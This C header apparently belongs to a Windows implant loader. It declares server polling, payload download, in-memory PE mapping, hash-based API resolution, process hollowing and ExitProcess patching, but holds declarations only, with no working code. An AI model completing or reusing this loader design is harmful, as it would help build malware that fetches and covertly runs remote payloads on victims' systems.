#pragma once

#include "../core/core.h"



typedef struct _LdrMemContext {
	PVOID BaseAddress;
} LdrMemContext;


typedef struct _LdrTask {
	DWORD code;
	DWORD Id;
	DWORD DataSize;
	DWORD FileType;
	PBYTE Data;
	PCHAR args;
	BOOL hasReloc;
	BOOL ok;
} LdrTask;

#define FILE_EXE       0xac
#define FILE_DLL 	   0xab

#define TASK_LOAD 0x1
#define TASK_MODULE 0x3
#define TASK_NO_TASK 0xff

#define MSG_GET_FILE    0xab
#define POLL_CODE       0xac
#define MSG_OUTPUT      0xad
#define MSG_NEEDS_PARSE 0xaf
#define CODE_REGISTER   0xab

#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)


typedef struct _Module {
	DWORD size;
	DWORD Version;

	void (WINAPI *ModuleWrite4)(PVOID ctx, DWORD val);
	void (WINAPI *ModuleWrite8)(PVOID ctx, ULONGLONG val);
	void (WINAPI *ModuleWriteStr)(PVOID ctx, PCHAR str, DWORD len);

	HMODULE (WINAPI *ModuleGetModule)(DWORD hash);
	FARPROC (WINAPI *ModuleGetProc)(HMODULE mod, DWORD hash);
	HMODULE (WINAPI *ModuleLoadLibraryA)(PCHAR name);
	BOOL    (WINAPI *ModuleFreeLibrary)(HMODULE mod);
} Module, *pModule;

typedef BOOL (WINAPI* pModuleEntry)(pModule api, PVOID ctx, PBYTE args, DWORD ArgLen);


#define DOS_HEADER(base)       ((PIMAGE_DOS_HEADER)(base))
#define NT_HEADERS(base)       ((PIMAGE_NT_HEADERS)((PBYTE)(base) + DOS_HEADER(base)->e_lfanew))
#define OPT_HEADER(base)       (&NT_HEADERS(base)->OptionalHeader)
#define FILE_HEADER(base)      (&NT_HEADERS(base)->FileHeader)
#define SECTION_HEADER(base)   ((PIMAGE_SECTION_HEADER)((PBYTE)&NT_HEADERS(base)->OptionalHeader + FILE_HEADER(base)->SizeOfOptionalHeader))
#define RVA2VA(type, base, rva) ((type)((PBYTE)(base) + (rva)))

#define CurrentProcess() ((HANDLE)-1)

LdrTask LdrPullFile();
void LdrInitPoll();
LdrTask LdrPollServer();
BOOL LdrLoadAndRun(LdrTask info, BOOL CleanUpAfter);
BOOL LdrRunModule(LdrTask info, BOOL CleanUpAfter);
BOOL LdrRunExe(LdrTask info);
BOOL LdrHollowExe(LdrTask info);

BOOL   HasReloc(PBYTE pe);
DWORD  SectionCharsToProt(DWORD chars);
void   LdrCopySections(PVOID Base, PBYTE Raw, PIMAGE_SECTION_HEADER sec, WORD numSections);
BOOL   LdrProcessRelocs(PVOID Base, PBYTE Raw);
void   LdrProcessIAT(PVOID Base, PBYTE Raw);
void LdrPatchExitProcess(void);
void   LdrSetSectionPerms(PVOID Base, PIMAGE_SECTION_HEADER sec, WORD numSections);
